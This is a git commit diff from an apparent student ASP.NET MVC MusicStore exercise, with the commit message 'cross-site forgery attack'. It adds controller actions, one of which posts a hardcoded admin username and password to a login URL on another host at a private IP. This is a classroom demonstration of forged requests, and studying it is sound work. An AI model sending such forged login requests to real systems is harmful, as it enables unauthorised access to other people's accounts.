17ba5ab619b9b58727b857b36e53633bc470be13
huangmeixiqi <1600582963@qq.com>
2018-12-03 15:41:34 +0800

    跨站伪造攻击12.3

--- huangmeixi作业区/SAP.NET MVC 作业区/05MusicStore1/MusicStore101/MusicStore/Controllers/HomeController.cs
+++ huangmeixi作业区/SAP.NET MVC 作业区/05MusicStore1/MusicStore101/MusicStore/Controllers/HomeController.cs
@@ -5,6 +5,8 @@ using MusicStoreEntity.UserAndRole;
 using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Net.Http;
+using System.Threading.Tasks;
 using System.Web;
 using System.Web.Mvc;
 
@@ -41,5 +43,30 @@ namespace MusicStore.Controllers
             else
                 return "登录失败";
         }
+        /// <summary>
+        /// 伪造攻击
+        /// </summary>
+        /// <returns></returns>
+
+        public ActionResult TestHack()
+        {
+            return View();
+        }
+        /// <summary>
+        /// 用C#进行跨站伪造攻击
+        /// </summary>
+        /// <returns></returns>
+        public async Task<ActionResult> TesthackC()
+        {
+            var client = new HttpClient();
+            //初始化提交的参数
+            var values =new List<KeyValuePair<string,string>> ();
+            values.Add(new KeyValuePair<string, string>("UserName", "admin"));
+            values.Add(new KeyValuePair<string, string>("PassWord", "123.abc"));
+            var content = new FormUrlEncodedContent(values);
+            var respnse = await client.PostAsync("http://10.88.91.101:9000/account/login", content);
+            var html = await respnse.Content.ReadAsStringAsync();
+            return Json("");
+                }
     }
 }
